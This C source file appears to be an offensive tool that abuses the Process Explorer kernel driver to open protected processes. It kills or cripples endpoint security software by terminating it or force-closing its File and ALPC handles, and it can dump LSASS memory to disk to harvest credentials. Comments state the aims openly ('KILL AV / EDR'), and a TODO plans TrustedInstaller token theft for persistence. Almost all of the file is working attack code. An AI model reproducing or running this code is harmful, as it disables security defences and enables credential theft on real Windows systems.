#include "definitions.h"
#include "minidump.h"
typedef struct procexp_close_handle {
	ULONGLONG pPid = 0x0;
	PVOID ObjectType;
	ULONGLONG nothing2 = 0x0;
	ULONGLONG handle;
} Procexp_close, *pProcexp_close;


/*Creates the handle to the driver object*/
HANDLE hProcExpDevice;

HANDLE open_driver()
{
	hProcExpDevice = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hProcExpDevice == INVALID_HANDLE_VALUE)
	{
		printf("No pude obtener el handle al driver.\nError code:%d\n", GetLastError());
		return 0;
	}
	else {
		printf("HANDLE %p\n", hProcExpDevice);
	}
	return hProcExpDevice;
}

/*Opens handle to a protected process*/
HANDLE open_handle(ULONGLONG processPid, HANDLE hProcExpDevice)
{
	HANDLE hProtectedProcess = NULL;
	DWORD dwBytesReturned = 0;
	BOOL ret = FALSE;
	char* endptr=0;

	ret = DeviceIoControl(hProcExpDevice, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, (LPVOID)&processPid, sizeof(processPid),
		&hProtectedProcess,
		sizeof(HANDLE),
		&dwBytesReturned,
		NULL);


	if (dwBytesReturned == 0 || !ret)
	{
		printf("Protected process opening error: %d\n", GetLastError());
		return 0;
	}

	return hProtectedProcess;
}




/*In case of x64 may be redefined as it's here*/
typedef struct my__PUBLIC_OBJECT_TYPE_INFORMATION {

	UNICODE_STRING TypeName;

	ULONGLONG Reserved[22];    // reserved for internal use

} myPUBLIC_OBJECT_TYPE_INFORMATION, * myPPUBLIC_OBJECT_TYPE_INFORMATION;

/*Workaround to handle enumeration crash (Fucking shit!!)*/
int filter(unsigned int code)
{
	/*Spaguetti code for debugging purpose*/
	if (code == EXCEPTION_ACCESS_VIOLATION)
	{
		return EXCEPTION_EXECUTE_HANDLER;
	}
	else
		return -1;
}


/*Close handle || KILL AV / EDR */
BOOL close_handle(HANDLE driverHandle, Procexp_close sProcexp)
{
	DWORD bytes = 0;
	BOOL ret = DeviceIoControl(driverHandle, IOCTL_CLOSE_HANDLE, &sProcexp, sizeof(sProcexp), NULL, 0, &bytes, NULL);
	if (!ret)
	{
		printf("Error closing handle: (%d)\n", GetLastError());
		return FALSE;
	}
	else
	{
		printf("Closed handle beloging to EDR: 0x%x\n", (UINT)sProcexp.handle);
	}
	return TRUE;

}

/*Obtain information about handles beloging to EDR // AV and if ALPC or File kills them*/
int handleTableInformation(HANDLE hProtectedProcess, ULONGLONG processId)
{
	Procexp_close sProcexp = { 0 };
	BOOL handle = 0;
	ULONGLONG returnLenght = 0;
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(SystemHandleInformationSize);
	if (!handleTableInformation)
	{
		printf("Error allocating memory: (0x%x)\n", GetLastError());
		return 0;
	}
	more:
	NTSTATUS stat = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
	DWORD controler = 0;
	ULONGLONG adjustLenght;
	while (stat == STATUS_INFO_LENGTH_MISMATCH)
	{
		handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)realloc(handleTableInformation, returnLenght);
		adjustLenght = returnLenght;
		stat = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, adjustLenght, &returnLenght);
		controler += 1;

	}
	if (stat != 0 && stat != STATUS_INFO_LENGTH_MISMATCH)
	{
		printf("Error getting handles: (0x%x)\n", stat);
		return 0;
	}
	DWORD counter = 0;
	myPUBLIC_OBJECT_TYPE_INFORMATION info;
	DWORD length;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;
	for (ULONGLONG i = 0; i < handleTableInformation->NumberOfHandles; i++)
	{
		__try
		{
			handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];
		}
		__except (filter(GetExceptionCode())) /*Workaround to a fucking crash*/
		{
			if (handle == FALSE)
			{
				printf("returning with errors\n");
				goto more;
			}
				
			goto return_handle_table;
		}
		if (handleInfo.UniqueProcessId == processId) /*If process which belongs the handle is our process*/
		{
			//Obtain type of handle (name)
			handle = TRUE;

			NTSTATUS stat = NtQueryObject((HANDLE)handleInfo.Handle, ObjectTypeInformation, &info, sizeof(myPUBLIC_OBJECT_TYPE_INFORMATION), &length);
			if (stat != 0)
			{
				if (stat == 0xc0000008)
					continue;
				printf("Error: (0x%x) with handle: (0x%x)\n", stat, handleInfo.Handle);
				return 0;
			}
			else
			{
				if (wcscmp(info.TypeName.Buffer, L"File") == 0) //Check if handle is type File
				{
					handle = TRUE;
					sProcexp.pPid = processId; /*Structure to pass to DeviceIoControl*/
					sProcexp.handle = (ULONGLONG)handleInfo.Handle;
					sProcexp.ObjectType = (PVOID)handleInfo.Object;
					close_handle(hProcExpDevice, sProcexp); //Kill the EDR
					counter += 1;
				}
				if (wcscmp(info.TypeName.Buffer, L"ALPC Port") == 0) /*If driver is ALPC type*/
				{
					handle = TRUE;

					printf("ALPC here\n");
					sProcexp.pPid = processId;
					sProcexp.handle = (ULONGLONG)handleInfo.Handle;
					sProcexp.ObjectType = (PVOID)handleInfo.Object;
					close_handle(hProcExpDevice, sProcexp); //Kill it!!
					counter += 1;
				}
			}

			
			if (counter == 0x1000) //Buffer is not long enough (We don´t usually arrive to here)
			{
				printf("Not completed\n");
				return -1;
			}

				
		}
	}

return_handle_table:
	printf("[*][*] EDR should be dead || Manual check and if not dead launch me again!!\n");
		return 0;
}


//In case you want to manipulate your token to be NT AUTHORITY\SYSTEM or more things ;-)
// TO-DO:
//Implement the token duplication of trustedinstaller.exe, which has permissions to modify trusted DLLs and do persistence in that mode
HANDLE token_duplication(HANDLE protectedHandle, HANDLE driverHandle)
{
	HANDLE token = NULL;
	DWORD bytes = NULL;
	BOOL ret = DeviceIoControl(driverHandle, IOCTL_DUPLICATE_TOKEN, &protectedHandle, sizeof(HANDLE), &token, sizeof(HANDLE), &bytes, NULL);
	if (!ret)
	{
		printf("Error: (%d)\n", GetLastError());
		return 0;
	}
	else
	{
		printf("Token handle: 0x%x\n", token);
	}
	return token;

}


/*UCHAR query_process_information(HANDLE lsassProtectedProcess)
{
	DWORD returnLenght = 0;
	PS_PROTECTION protection;
	fNtQueryProcessInformation NtQueryInformationProcess = (fNtQueryProcessInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "ZwQueryInformationProcess");
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
	NTSTATUS stat = NtQueryInformationProcess(lsassProtectedProcess, (PROCESSINFOCLASS)ProcessProtectionInformation, &protection, sizeof(protection), NULL);
	if (stat != 0)
	{
		printf("Error getting protection information: (0x%x)\n", stat);
		return -1;
	}
	return protection.Level;
}*/


void dump_lsass(HANDLE protectedLsass, ULONG lsassPid)
{
	HANDLE outFile = CreateFile(L"C:\\Users\\vm1\\Desktop\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	// Create minidump
	PROCESS_BASIC_INFORMATION BasicInfo;
	fNtQueryProcessInformation NtQueryInformationProcess = (fNtQueryProcessInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "ZwQueryInformationProcess");
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
	NTSTATUS stat = NtQueryInformationProcess(protectedLsass, ProcessBasicInformation, &BasicInfo, sizeof(BasicInfo), NULL);
	if (stat != 0)
	{
		printf("Error getting information: (0x%x)\n", stat);
		return;
	}
	PEB pPeb;
	BOOL bSuccess = ReadProcessMemory(protectedLsass, (LPCVOID)BasicInfo.PebBaseAddress, &pPeb, sizeof(PEB), NULL);
	if (!bSuccess)
	{
		printf("Error: %d\n", GetLastError());
		return;
	}
	printf("We can read LSASS and it's protected\n");
	BOOL isDumped = MiniDumpWriteDumpA(protectedLsass, lsassPid, outFile);

	if (isDumped) {
		printf("[+] lsass dumped successfully!\n");
	}
	//restore_parameters(myPEB);
	else
	{
		printf("Error dumping: (0x%x)\n", GetLastError());
	}

	printf("exiting\n");
	return;
}

BOOL enumerate_processes(ULONGLONG processId)
{
	DWORD process_array[0x1000];
	DWORD ret_value;
	BOOL value = EnumProcesses(process_array, 0x400, &ret_value);
	if (value)
	{
		for (int i = 0; i < 0x400; i++)
		{
			if (process_array[i] == processId)
				return TRUE;
		}
	}
	return FALSE;
}
int main(int argc, char **argv)
{
	
	ULONGLONG lsassPid=0;
	char* endPtr;


	if (argc < 2)
	{
		printf("./%s <process_id> <optional_lsass_process>\n", argv[0]);
		return -1;
	}
	if (argc > 2)
	{
		endPtr = 0;
		lsassPid = strtol(argv[2], &endPtr, 10);
	}
	if (!SetDebugPrivilege())
	{
		printf("Not privilege\n");
	}
	HANDLE hProcExpDevice = open_driver();
	if (!hProcExpDevice)
	{
		printf("Open handle error\n");
		return -1;
	}
	endPtr = 0;

	ULONGLONG pid = strtol(argv[1], &endPtr, 10);
	HANDLE protectedProcess = open_handle(pid, hProcExpDevice);
	if (!protectedProcess)
	{
		printf("Error getting process\n");
		return -1;
	}
	HANDLE lsassProcess=0;
	if (lsassPid != 0)
	{
		lsassProcess = open_handle(lsassPid, hProcExpDevice);
		if (!lsassProcess)
		{
			printf("Error getting process\n");
			return -1;
		}
		/*BYTE protection = query_process_information(lsassProcess);
		if (protection < 0)
		{
			printf("Error getting process info\n");
		}
		else
			_PRINT(protection);*/
		
	}


	/*HANDLE token = token_duplication(protectedProcess, hProcExpDevice);

	if (!token)
	{
		printf("Not token\n");
		return -1;
	}*/
	if (!TerminateProcess(protectedProcess, -1))
	{
		while (enumerate_processes(pid))
			handleTableInformation(protectedProcess, pid);
	}
	else
		printf("Terminated EDR\n");
	if (lsassProcess)
		dump_lsass(lsassProcess, lsassPid);
	printf("Closed\n");

	/*Close modules*/
	CloseHandle(protectedProcess);
	CloseHandle(hProcExpDevice);
	//CloseHandle(token);
	return 0;
}
